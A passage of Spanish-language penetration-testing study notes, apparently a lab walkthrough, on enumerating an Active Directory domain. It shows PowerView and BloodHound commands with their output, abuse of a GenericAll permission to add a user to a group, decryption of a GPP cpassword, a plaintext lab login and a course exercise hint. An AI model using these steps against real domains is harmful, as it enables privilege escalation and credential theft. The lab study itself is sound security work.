serviceprincipalname          : {TERMSRV/DC1, TERMSRV/DC1.corp.com, Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.corp.com, ldap/DC1.corp.com/ForestDnsZones.corp.com...}
usncreated                    : 12293
lastlogon                     : 10/18/2022 3:37:56 AM
badpwdcount                   : 0
cn                            : DC1
useraccountcontrol            : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 9/2/2022 11:10:48 PM
primarygroupid                : 516
iscriticalsystemobject        : True
msds-supportedencryptiontypes : 28
usnchanged                    : 178663
ridsetreferences              : CN=RID Set,CN=DC1,OU=Domain Controllers,DC=corp,DC=com
dnshostname                   : DC1.corp.com
```

De nuevo, podemos aprovecharnos de la sofisticación de Powerview para filtrar el contenido con el cmdlet 'Select':

```
PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname

operatingsystem              dnshostname
---------------              -----------
Windows Server 2022 Standard DC1.corp.com
Windows Server 2022 Standard web04.corp.com
Windows Server 2022 Standard FILES04.corp.com
Windows 11 Pro               client74.corp.com
Windows 11 Pro               client75.corp.com
Windows 10 Pro               CLIENT76.corp.com
```

<br />

#### 3.2. Permissions and Logged on Users.

En esta parte vamos a centrarnos al detalle en relaciones complejas que pueden existir entre objetos de AD. Concretamente, permisos y usuarios logeados en el momento.

Enumerar permisos es fundamental por razones obvias, sin embargo, no es tan obvio por qué debemos saber qué usuarios están logeados en un dominio. Cuando un usuario está logeado en un dominio sus credenciales se almacenan en caché en memoria permitiéndonos a nosotros la oportunidad de robarlos y quizá elevar nuestros privilegios o lograr permanencia.

<br />

**Find Administrative Permissions**

Comencemos el comando Find-LocalAdminAccess de PowerView. Este comando escanea la red para determinar si nuestro usuario posee permisos administrativos en algún equipo del dominio. Para ello intenta conectar con el SCM (Service Control Manager), que mantiene una base de datos con servicios y drivers dentro de una máquina Windows, con el privilegio de acceso SC_MANAGER_ALL_ACCESS (que requiere permisos administrativos). Si la conexión es satisfactoria, PowerView determina que nuestro usuario tiene privilegios administrativos en la máquina sobre la que se ha hecho la conexión.

```
PS C:\Tools> Find-LocalAdminAccess
client74.corp.com
```

<br />

**Find Logged-In users**

El siguiente paso consiste en descubrir qué y cuántos usuarios están conectados al dominio. Esto lo conseguimos con Get-NetSession, pero necesitamos ciertos permisos por lo que lo coherente sería probarlo en la máquina en la que sabemos que tenemos privilegios administrativos:

```
PS C:\Tools> Get-NetSession -ComputerName files04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied

PS C:\Tools> Get-NetSession -ComputerName web04 -Verbose
VERBOSE: [Get-NetSession] Error: Access is denied

PS C:\Tools> Get-NetSession -ComputerName client74

CName        : \\192.168.50.75
UserName     : stephanie
Time         : 8
IdleTime     : 0
ComputerName : client74
```

A veces, PowerView puede no ser fiable por distintas razones, por esto es necesario a veces recurrir a otras herramientas como por ejemplo PsLoggedOn de SysInternals Suite. La documentación establece que PsLoggedOn enumerará las claves de registro en *HKEY_USERS* para recuperar los *security identifier* (SID) de los usuarios que iniciaron sesión y convertir los SID en nombres de usuario. PsLoggedOn también usará la API _de NetSessionEnum_ para ver quién inició sesión en la computadora a través de recursos compartidos.

Una limitación es que PsLoggedOn se basa en el servicio *Remote Registry* para escanear la clave asociada. El Remote Registry service no se ha habilitado de forma predeterminada en las estaciones de trabajo de Windows desde Windows 8, pero los administradores del sistema pueden habilitarlo para diversas tareas administrativas, para compatibilidad con versiones anteriores o para instalar herramientas de monitoreo/implementación, scripts, agentes, etc.

De forma que PsLoggedon será fiable en la medida en la que el servicio se esté ejecutando.

```
PS C:\Tools\PSTools> .\PsLoggedon.exe \\files04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeff
Unable to query resource logons

PS C:\Tools\PSTools> .\PsLoggedon.exe \\client74

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Users logged on locally:
     <unknown time>             CORP\jeffadmin

Users logged on via resource shares:
     10/5/2022 1:33:32 AM       CORP\stephanie

PS C:\Tools\PSTools> .\PsLoggedon.exe \\web04

PsLoggedon v1.35 - See who's logged on
Copyright (C) 2000-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

No one is logged on locally.
Unable to query resource logons
```

La última máquina nos indica que no hay nadie en web04, sin embargo y hasta donde sabemos, esto podría ser un falso positivo porque no tenemos la certeza de que RD service se esté ejecutando.

<br />

<br />

#### 3.3. Enumerating Through Service Principal Names.

**Introducción al SPN**

Para finiquitar nuestra enumeración de cuentas nos concentraremos sobre las *Service Accounts* (cuentas vinculadas a servicios, más especificamente;  "A _service account_ is a user account that's created explicitly to provide a security context for services that are running on Windows Server...") que también pueden estar involucradas en permisos administrativos.

En cualquier sistema operativo ocurre que una aplicación necesita ejecutarse en el contexto de un usuario de sistema operativo. Cuando el sistema lanza una aplicación está corre bajo el contexto de un predefined Service Account: LocalSystem, LocalService, NetworkService. Puntualmente, en situaciones más complejas, un servicio puede ejecutarse en el contexto de una cuenta de un Domain User.

De esta forma, y en cualquier caso, aplicaciones integradas del dominio (como _Exchange_ (Email), MS SQL (Database) o _Internet Information Services_ (IIS, web server)) reciben un *unique service instance identifier* (identificador) conocido como SPN, que asocia un servicio a la cuenta bajo cuyo contexto de seguridad se está ejecutando (Ya sea un Domain User o un Service Account) es decir; **SPN es el identificador de una instancia de un servicio en ejecución que lo asocia al contexto de seguridad de una cuenta de usuario**. Esta entidad es importante porque mediante un tipo de ataque denominado Kerberoasting, podemos hacernos con el hash de contraseña 

De esta forma, el SPN identifica un servicio ejecutándose unívocamente y podemos realizar una enumeración completa del servicio a través de su SPN evitando escaneos y testeos con herramientas de terceros como Nmap o Crackmapexec. 

Observemos que esto no significa que el servicio esté ejecutándose como dicha cuenta, sólo está usando su contexto de seguridad. 

<br />

**Enumeración de SPNs**

Dado que la información se registra y almacena en AD, está información relativa al SPN está presente en el Domain Controller. Para obtener los datos, consultaremos sobre el DC, esta vez buscando SPN específicos.


<br />

*Setspn.exe*

Para enumerar SPN en el dominio, tenemos múltiples opciones. En este caso, usaremos **setspn.exe** , que está instalado en Windows de forma predeterminada. Usaremos **-L** para ejecutar contra servidores y clientes en el dominio.

Si bien pudimos iterar a través de la lista de usuarios del dominio, previamente descubrimos al usuario _iis_service ._ Comencemos con ese:

```
c:\Tools>setspn -L iis_service
Registered ServicePrincipalNames for CN=iis_service,CN=Users,DC=corp,DC=com:
        HTTP/web04.corp.com
        HTTP/web04
        HTTP/web04.corp.com:80
```

Así, está claro que existe un servicio HTTP vinculado a esta cuenta en el dominio.

<br />

*PowerView*

Otra forma sería a través de PowerView. Podemos filtrar el output de Get-NetUser para obtener solo los atributos samaccotunname y serviceprincipalname:

```
PS C:\Tools> Get-NetUser -SPN | select samaccountname,serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
iis_service    {HTTP/web04.corp.com, HTTP/web04, HTTP/web04.corp.com:80}
```

El output indica de nuevo que el usuario iis_service tiene asociado la ejecución de lo que parece un servidor web en web04.corp.com:

```
PS C:\Tools\> nslookup.exe web04.corp.com
Server:  UnKnown
Address:  192.168.50.70

Name:    web04.corp.com
Address:  192.168.50.72
```

<br />

#### 3.4. Enumerating Object Permissions.

**Understanding Permissions on AD**

En esta sección aprenderemos a enumerar permisos específicos asociados a objetos en AD. En resúmen, cualquier objeto de AD tiene configurado un conjunto de permisos en lo que se conoce como Access Control Entries (ACE), entradas que se agrupan en *Access Control List* (ACL). Cada entrada define si el acceso al mencionado objeto es permitido o denegado.   

Como ejemplo muy básico, digamos que un usuario de dominio intenta acceder a un recurso compartido de dominio (que también es un objeto). El objeto de destino, en este caso el recurso compartido, pasará luego por una verificación de validación basada en la ACL para determinar si el usuario tiene permisos para el recurso compartido. Esta validación de ACL implica dos pasos principales. En un intento de acceder al recurso compartido, el usuario enviará un _Access Token_ , que consiste en la identidad y los permisos del usuario. Luego, el objeto de destino validará el token con la lista de permisos (la ACL). Si la ACL permite que el usuario acceda al recurso compartido, se otorga el acceso. En caso contrario se deniega la solicitud.

Entre la variedad de permisos que puede tener asigandos un objeto, desde la perspectiva de los atacantes, estamos interesados en los siguientes:

```
GenericAll: Full permissions on objec
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for objec
Self (Self-Membership): Add ourselves to for example a group
```

<br />

**Enumerating Permissions on AD**

Con PowerView podemos emplear el Get-ObjectAcl para obtener el listado de entradas que definen los permisos de un objeto:

```
PS C:\Tools> Get-ObjectAcl -Identity stephanie

...
ObjectSID              : S-1-5-21-1987370270-658905905-1781884369-1104
ActiveDirectoryRights  : ReadProperty
[...]
SecurityIdentifier     : S-1-5-21-1987370270-658905905-1781884369-553
[...]
```

De entre las múltiples propiedades del objeto que se extraen, estamos interesados sólo en las mostradas en el listado anterior. 

- *ObjectSID* que es el SID del objeto al que refiere los permisos, 
- *ActiveDirectoryRights* el ACE en cuestión.
- SecurityIdentifier, el SID del objeto que posee los permisos sobre el objeto del ObjectSID.

Ninguno de los dos identificadores son legibles al ojo humano, pero pueden ser reinterpreados con el comando de PowerView **Convert-SidToName**

```
PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
CORP\stephanie

PS C:\Tools> Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
CORP\RAS and IAS Servers
```

Ahora somos capaces de apreciar a quién pertenecen ambos SID. De esta forma, los miembros del grupo RAS and IAS Servers tienen ACE de ReadProperty sobre el objeto stephanie (evidentemente esto aplica sobre aquellos objetos como directorios o ficheros que hereden el contexto de seguridad de stephanie).

En resumen, estamos interesados ​​en _ActiveDirectoryRights_ y _SecurityIdentifier_ para cada objeto que enumeramos en el futuro.

Para generar resultados limpios y manejables, usaremos el indicador PowerShell **-eq** para filtrar la propiedad **ActiveDirectoryRights**, mostrando solo los valores que equivalen a **GenericAll**. Luego canalizaremos los resultados a **select** , mostrando solo las propiedades **SecurityIdentifier** y **ActiveDirectoryRights :**

```
PS C:\Tools> Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1987370270-658905905-1781884369-512             GenericAll
S-1-5-21-1987370270-658905905-1781884369-1104            GenericAll
S-1-5-32-548                                             GenericAll
S-1-5-18                                                 GenericAll
S-1-5-21-1987370270-658905905-1781884369-519             GenericAll
```

De esta forma sabesmos que los objetos referidos por los SID obtenidos poseen el ACE GenericAll sobre el objeto grupo Management Departament.

Luego transformamos estos identificadores para obtener los nombres de las cuentas o grupos referidos:

```
PS C:\Tools> "S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
CORP\Domain Admins
CORP\stephanie
BUILTIN\Account Operators
Local System
CORP\Enterprise Admins
```

Observemos que Stephanie tiene GenericAll ACE sobre el objeto grupo Management Departament (esto no es habitual, probablemente sea una malconfiguración). Esto significa que tenemos control total sobre este objeto y podemos, por ejemplo, manipularlo para añadirnos a dicho grupo:

```
PS C:\Tools> net group "Management Department" stephanie /add /domain
The request will be processed at a domain controller for domain corp.com.

The command completed successfully.

PS C:\Tools> Get-NetGroup "Management Department" | select member

member
------
{CN=jen,CN=Users,DC=corp,DC=com, CN=stephanie,CN=Users,DC=corp,DC=com}
```

<br />

*BloodHound*

Por último, BloodHound, una herramienta automatizada de enumeración para redes de AD también permite mostrar la información acerca de si algún usuario del dominio tiene asociado a su vez un SPN.

<br />
#### 3.5. Enumerating Domain Shares.

Por último, vamos a enumerar Domain Shares o recursos compartidos en el dominio.

Comenzaremos por el Cmdlet Find-DomainShare de PowerView con la flag *-CheckShareAccess* para enumerar shares accesibles por nuestro usuario:

```
PS C:\Tools> Find-DomainShare

Name           Type Remark                 ComputerName
----           ---- ------                 ------------
ADMIN$   2147483648 Remote Admin           DC1.corp.com
C$       2147483648 Default share          DC1.corp.com
IPC$     2147483651 Remote IPC             DC1.corp.com
NETLOGON          0 Logon server share     DC1.corp.com
SYSVOL            0 Logon server share     DC1.corp.com
ADMIN$   2147483648 Remote Admin           web04.corp.com
backup            0                        web04.corp.com
C$       2147483648 Default share          web04.corp.com
IPC$     2147483651 Remote IPC             web04.corp.com
ADMIN$   2147483648 Remote Admin           FILES04.corp.com
C                 0                        FILES04.corp.com
C$       2147483648 Default share          FILES04.corp.com
docshare          0 Documentation purposes FILES04.corp.com
IPC$     2147483651 Remote IPC             FILES04.corp.com
Tools             0                        FILES04.corp.com
Users             0                        FILES04.corp.com
Windows           0                        FILES04.corp.com
ADMIN$   2147483648 Remote Admin           client74.corp.com
C$       2147483648 Default share          client74.corp.com
IPC$     2147483651 Remote IPC             client74.corp.com
ADMIN$   2147483648 Remote Admin           client75.corp.com
C$       2147483648 Default share          client75.corp.com
IPC$     2147483651 Remote IPC             client75.corp.com
sharing           0                        client75.corp.com
```

Centraremos nuestra atención en primer lugar sobre SYSVOL, debido a que puede tener información sensible. 

De manera predeterminada, la carpeta **SYSVOL** está asignada a **%SystemRoot%\SYSVOL\Sysvol\domain-name** en el controlador de dominio y todos los usuarios del dominio tienen acceso a ella.

```
PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\

    Directory: \\dc1.corp.com\sysvol\corp.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         9/21/2022   1:11 AM                Policies
d-----          9/2/2022   4:08 PM                scripts
```

Encontramos dentro de esta carpeta una contraseña:

```
PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
[...]
          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
[...]
```

Históricamente, los administradores del sistema a menudo cambiaban las contraseñas de las estaciones de trabajo locales a través de *Group Policy Preferences* (GPP).

Sin embargo, aunque las contraseñas almacenadas en GPP están cifradas con AES-256, la clave privada para el cifrado se ha publicado en _MSDN_ . Podemos usar esta clave para descifrar estas contraseñas cifradas. En este caso, usaremos el script **gpp-decrypt** ruby ​​en Kali Linux que descifra una cadena encriptada GPP determinada:

```
kali@kali:~$ gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
P@$$w0rd
```

Además de contraseñas cifradas también podemos encontrar emails u otros posibles leaks.

<br />

### 4. Automated Enumeration.

Hay dos herramientas que automatizan el proceso de enumeración manual que hemos visto antes, SharpHound y BloodHound. Ambos son herramientas de recolección de datos de AD y forman parte del mismo pack siendo la priemera una utilidad cli que recopila información y la segunda una herramienta con interfaz gráfica que expone la información recopilada en la sección anterior .

<br />
#### 4.1. Collecting Data with SharpHound.

Podemos emplear Sharphound importándolo al sistema como PowerUp. A modo de resúmen, este script esencialmente realiza una ejecución de una serie de comandos de enumeración de dominio similar a los que podemos encontraro con los módulos de PowerUp o PowerView y colecciona los resultados en un zip.


Recordemos que esencialmente estamos invocando un script y que por ello debemos tener habilitada una sesión de powershell con la prevención anti-scripts deshabilitada:

```
PS C:\Tools> Import-Module .\Sharphound.ps1
```

Una vez importado podemos ver las opciones disponibles con el siguiente cmd-let:

```
PS C:\Tools> Get-Help Invoke-BloodHound

NAME
    Invoke-BloodHound

SYNOPSIS
    Runs the BloodHound C# Ingestor using reflection. The assembly is stored in this file.


SYNTAX
    Invoke-BloodHound [-CollectionMethod <String[]>] [-Domain <String>] [-SearchForest] [-Stealth] [-LdapFilter <String>] [-DistinguishedName
    <String>] [-ComputerFile <String>] [-OutputDirectory <String>] [-OutputPrefix <String>] [-CacheName <String>] [-MemCache] [-RebuildCache]
    [-RandomFilenames] [-ZipFilename <String>] [-NoZip] [-ZipPassword <String>] [-TrackComputerCalls] [-PrettyPrint] [-LdapUsername <String>]
    [-LdapPassword <String>] [-DomainController <String>] [-LdapPort <Int32>] [-SecureLdap] [-DisableCertVerification] [-DisableSigning]
    [-SkipPortCheck] [-PortCheckTimeout <Int32>] [-SkipPasswordCheck] [-ExcludeDCs] [-Throttle <Int32>] [-Jitter <Int32>] [-Threads <Int32>]
    [-SkipRegistryLoggedOn] [-OverrideUsername <String>] [-RealDNSName <String>] [-CollectAllProperties] [-Loop] [-LoopDuration <String>]
    [-LoopInterval <String>] [-StatusInterval <Int32>] [-Verbosity <Int32>] [-Help] [-Version] [<CommonParameters>]


DESCRIPTION
    Using reflection and assembly.load, load the compiled BloodHound C# ingestor into memory
    and run it without touching disk. Parameters are converted to the equivalent CLI arguments
    for the SharpHound executable and passed in via reflection. The appropriate function
    calls are made in order to ensure that assembly dependencies are loaded properly.


RELATED LINKS

REMARKS
    To see the examples, type: "get-help Invoke-BloodHound -examples".
    For more information, type: "get-help Invoke-BloodHound -detailed".
    For technical information, type: "get-help Invoke-BloodHound -full".
```

Entre las opciones más interesantes para nosotros se encontraría **-CollectionMethod**, que describe varios métodos de recolección de datos. Para recopilar toda la información utilizamos el valor **All** 

```
PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

Los datos recopilados se almacenan en el fichero .zip indicado:

```
PS C:\Tools> ls C:\Users\stephanie\Desktop\

    Directory: C:\Users\stephanie\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/27/2022  11:00 PM          12680 corp audit_20220927230019_BloodHound.zip
-a----         9/27/2022  11:00 PM           9734 MTk2MmZkNjItY2IyNC00MWMzLTk5YzMtM2E1ZDcwYThkMzRl.bin
```

Luego este zip puede ser transportado de vuelta o bien mediante carpeta compartida si hemos realizado una conexión mediante xfreerdp o mediante netcat subiendo el binario disponible en la kali nc.exe. (Más información en el repositorio de github).

<br />

#### 5.2. Analysing Data using BloodHound.

Sin embargo, la herramienta más interesante será BloodHound, la misma utilidad integrada en una GUI.

<br />

**Iniciando la interfaz gráfica**

En primer lugar, debemos iniciar el servicio **Neo4j**, instalado por defecto cuando llevamos a cabo la instalación de BloodHound mediante la APT.

```
kali@kali:~$ sudo neo4j start
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /usr/share/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /usr/share/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /usr/share/neo4j/run
Starting Neo4j.
Started neo4j (pid:334819). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

Tal y como el output indica, el servicio se ha activado y debería de ser accesible a través de la dirección: http://localhost:7474. Navegamos hacia esa dirección y nos logeamos como neo4j:neo4j.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230811122532.png' | relative_url }}" text-align="center"/>
</div>

Acto seguido se nos rederigirá sobre una página para actualizar la contraseña:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230811122611.png' | relative_url }}" text-align="center"/>
</div>

<br />

**Iniciando Bloodhound**

Una vez hemos instalado el servicio asociado a la configuración, ahora iniciamos la interfaz 

```
kali@kali:~$ bloodhound
```

y nos logeamos con las credenciales anteriores (recordemos que hemos cambiado la contraseña): 

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230811123718.png' | relative_url }}" text-align="center"/>
</div>

Ahora, se nos desplegará una interfaz gráfica vacía:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230811124050.png' | relative_url }}" text-align="center"/>
</div>

Ahora es el momento de importar la información recopilada en el .zip con SharpHound

Utilizamos el botón "Upload Data":

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230811124322.png' | relative_url }}" text-align="center"/>
</div>

Lo utilizamos para subir el fichero creado con SharpHound, en este caso nos logeamos como el usuario 'stephanie': 

```
xfreerdp /u:stephanie /v:192.168.238.75 /drive:home,/home/kali /p:"LegmanTeamBenzoin\!\!"
```

Una vez dentro, importamos el módulo de SharpHound.ps1 y recopilamos los datos:

```
C:\Tools> Powershell -ep bypass
[...]
PS C:\Tools>Import-Module .\Sharphound.ps1
PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
```

Los datos quedarán guardados en el escritorio de nuestro usuario actual, sólo quedará transferirlos a nuestra máquina Kali.

Una vez ahí, lo subimos a bloodhound y comenzamos la exploración.

En primer lugar, echamos un vistazo a las características de nuestra sesión y nuestra base de datos ampliando el menú arriba a la izquierda:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813120633.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, pulsamos en Analysis y se nos desplegará una serie de opciones:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813121542.png' | relative_url }}" text-align="center"/>
</div>

Cada una de estas opciones despliegará información por pantalla, por ejemplo, si seleccionamos Find all Domain Admin se desplegará información por pantalla:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813122100.png' | relative_url }}" text-align="center"/>
</div>

Si bajamos un poco y encontramos la opción *Find Shortest Paths to Domain Admins* podemos el autentico potencial de BloodHound, posando el ratón sobre cada entidad ya sea nodo o arista, podemos ver la referencia y la relación entre ambos objetos.

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813123038.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813123355.png' | relative_url }}" text-align="center"/>
</div>

Además, pulsando botón derecho sobre cada entidad y seguidamente pulsando '?', podemos acceder a la ayuda:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813123752.png' | relative_url }}" text-align="center"/>
</div>

<br />

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813123807.png' | relative_url }}" text-align="center"/>
</div>

De esta forma, la ayuda despliega información acerca de que Stephanie tiene privilegios administrativos sobre la máquina CLIENT74

Otros de los detalles en los que nos podemos fijar es por ejemplo vemos que el usuario JEFFADMIN tiene una sesión iniciada en CLIENT74 y esto probablemente signifique que sus credenciales estén cacheadas en sesión.

Otra de las características que queremos explorar de BloodHound es: *Shortest Paths to Domain Admins from Owned Principals*. En primera instancia si intentamos buscar esta opción obtendremos un mensaje diciendo: "NO DATA RETURNED FROM QUERY" 

Esto se debe a que todavía no hemos marcado ningún usuario/entidad como "Owned", para ello pulsamos botón derecho sobre la entidad y seleccionamos "Mark User/Computer as Owned".

Ahora repetiríamos la búsqueda obteniendo:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230813131646.png' | relative_url }}" text-align="center"/>
</div>

<br />

**RawQueries**

Ahora que hemos explicado el potencial de BloodHound y su alcance a nivel introductorio con las Prebuilt Queries pasamos al motor principal y más potente del BloodHound, las RawQueries, búsquedas personalizadas a partir de queries estructuradas en un lenguaje de búsqueda concreto.

En la interfaz de bloodhound podemos ver que, abajo, existe un botón denominado Raw Query. Si lo pulsamos se abre una barra en la que podemos escribir una búsqueda:


<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230918175301.png' | relative_url }}" text-align="center"/>
</div>

Aquí podemos realizar búsquedas sobre objetos o entidades del dominio e incluso filtrar, por ejemplo:

```
MATCH (m:User) RETURN m
```

Esta búsqueda devolverá los usuarios del domino (Domain Users):

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230918175606.png' | relative_url }}" text-align="center"/>
</div>

Podemos acceder a multitud de RawQueries hechas a través de los siguientes enlaces:

https://github.com/xenoscr/Useful-BloodHound-Queries/blob/master/List-Queries.md
https://gist.github.com/seajaysec/a4d4a545047a51053d52cba567f78a9b
https://infinitelogins.com/2022/01/28/bloodhound-cheatsheet-custom-queries-neo4j-lookups/

<br />

**Cómo utilizar BloodHound**

Ahora que entendemos cómo funciona BloodHound y cómo podemos operar con ella, ahora vamos a ver cómo deberíamos de proceder con esta herramienta para realizar una enumeración ordenada de un dominio de Active Directory.

En primer lugar, nos corresponde enumerar usuarios, grupos y máquinas:

```
MATCH (m:User) RETURN m
MATCH (m:Group) RETURN m
MATCH (m:Computer) RETURN m
```

Una vez hemos enumerado cada entidad, nos corresponde marcar aquellos usuarios, grupos o máquinas sobre los que nos hemos adueñado (Click derecho Mark as Owned). A partir de aquí, lanzamos queries que busquen vectores de ataque:

```
Domain Admins, Shortest path to domain admins, Shortest Path to Domain Admins from Owned Principals. (Pre-Build Querie)

SPNs o Kerberoastable accounts, Kerberostable members of High value Targets.(Pre-Build Querie)

RDP Access. (Pre-Build-Querie)

AS-REP vulnerable accounts

DCSynch privileges. Find principals to DCSynch Rights (Pre-Build Querie)
```

"High Value Targets" al igual que "Owned users" son usuarios que son marcados por el alto valor por el grupo al que pertenecen o una circunstancia similar y que forman parte de determinadas Pre-Build queries de trazado de ataques.

El objetivo último de esta recolección de información consiste en trazar vectores de ataque que nos permitan hacernos de una u otra manera con un Domain User o un Local Admin en el Domain Controller.

<br />

**3. Capstone Exercise: Start VM Group 2 and log in as _stephanie_ to CLIENT75. From CLIENT75, enumerate the object permissions for the domain users. Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag.**

When you Find-InterestingDomainAcl, you will find that Stephanie has GenericAll for robert user. Actually with this you can change robert password and able to login as him. While your current user is robert try running Find-LocalAdminAcces with runas. It should have output now. And btw this is the intended path.
 
<br />
### 5. Understanding Active Directory Authentication.

En esta sección cubriremos autenticación de NTLM y Kerberos y cómo recuperar credenciales almacenadas en caché.

A modo de resúmen, la principal diferencia entre la autenticación NTLM y la autenticación Kerberos es que el protocolo NTLM es utilizado por entidades ajenas al dominio que intentan autenticarse en alguna aplicación o servicio del dominio de forma que la aplicación pide autorización para el usuario al domain controller. En contraposición, el protocolo Kerberos es empleado para entidades registradas en el dominio que se autentican directamente en el Domain Controller y este les devuelve (en caso de autenticación exitosa) un ticket de acceso a otros recursos del dominio.

<br />

#### 5.1. NTLM Authentication.

La autenticación NTLM se usa cuando un cliente se autentica sobre un servidor con una dirección IP o con un hostname no registrado en el Active Directory-integrated DNS server de la red de AD. Además conviene mencionar que aplicaciones de terceros se autentican a través de NTLM en lugar de utilizar Kerberos.

El protocolo de autenticación NTLM consiste en 7 etapas representadas en la siguiente imagen:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230316093826.png' | relative_url }}" text-align="center"/>
</div>

1. En el primer paso, el cliente que desea autenticarse calcula un hash de la contraseña del usuario denominado *NTLM hash*.
2. Seguidamente, el cliente envía el username al servidor.
3. El servidor devuelve un valor aleatario conocido como *nonce* o *challenge*.
4. El cliente cifra el nonce empleando el NTLM hash de la contraseña y lo envía a modo de respuesta al servidor.
5. Ahora el servidor se pone en contacto con el DC de AD y le envía la respuesta del nonce.
6. El DC compara cifra con las credenciales del cliente el challenge y compara el resultado con la respuesta del cliente devuelta por el servidor. Si coincide, el cliente ha utilizado unas credenciales válidas y enviará una respuesta de aprovación de lo contrario devolverá una respuesta de denegación.

Como con cualquier otro hash, el hash NTLM no se puede revertir. Sin embargo, se considera un algoritmo criptográfico de "hashing rápido", ya que las contraseñas cortas se pueden descifrar en un lapso de días incluso con un equipo modesto.

Mediante el uso de software de craqueo como Hashcat con procesadores gráficos de primera línea, es posible probar más de 600 mil millones de hashes NTLM por segundo. Esto significa que todas las contraseñas de ocho caracteres pueden probarse en 2,5 horas y todas las contraseñas de nueve caracteres pueden probarse en 11 días.

A continuación, pasaremos a Kerberos, que es el protocolo de autenticación predeterminado en Active Directory y para los servicios asociados.

<br />

#### 5.2. Kerberos Authentication.

El protocolo de autenticación Kerberos es una adaptación realizada y empleada por Microsoft del protocolo de autenticación Kerberos version 5 creado por el MIT. 

La principal diferencia entre el protocolo Kerberos y el protcolo NTLM es que el último utiliza según hemos visto un esquema de challenge para probar la autenticidad del usuario mientras que el primero utiliza un sistema de autenticación basado en tickets. Veámos esto último con más profundidad.

A nivel superficial, la autenticación del cliente Kerberos para un servicio en Active Directory implica el uso de un DC en el papel de un Key Distribution Center (KDC).

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230316114927.png' | relative_url }}" text-align="center"/>
</div>

Así, cuando un usuario inicia sesión en su workstation, se envía una request al controlador de dominio (1), que tiene el rol de KDC y también el servicio de *Authentiction Server*. Esta *Authentication Server Request* (o AS_REQ) contiene una marca de tiempo que se cifra mediante un hash derivado de la contraseña del usuario y el nombre de usuario.

Cuando el DC recibe la solicitud, busca el hash de contraseña asociado con el usuario específico e intenta descifrar la marca de tiempo. Si el proceso de descifrado es exitoso y la marca de tiempo no es un duplicado (un posible ataque de reproducción), la autenticación se considera exitosa.

El DC responde al cliente con una *Authentication Server Reply* (AS_REP) que contiene una session key (dado que Kerberos es un stateless protocol, no conserva los resultados de las transacciones ni durante ni después del proceso de autenticación) y un *Ticket Granting Ticket* (TGT). La session key se cifra utilizando el hash de la contraseña del usuario, y el cliente puede descifrarla y reutilizarla. *El TGT contiene información sobre el contexto de seguridad del usuario, incluidas las pertenencias a grupos, el dominio, una marca de tiempo, la dirección IP del cliente y la clave de sesión*.

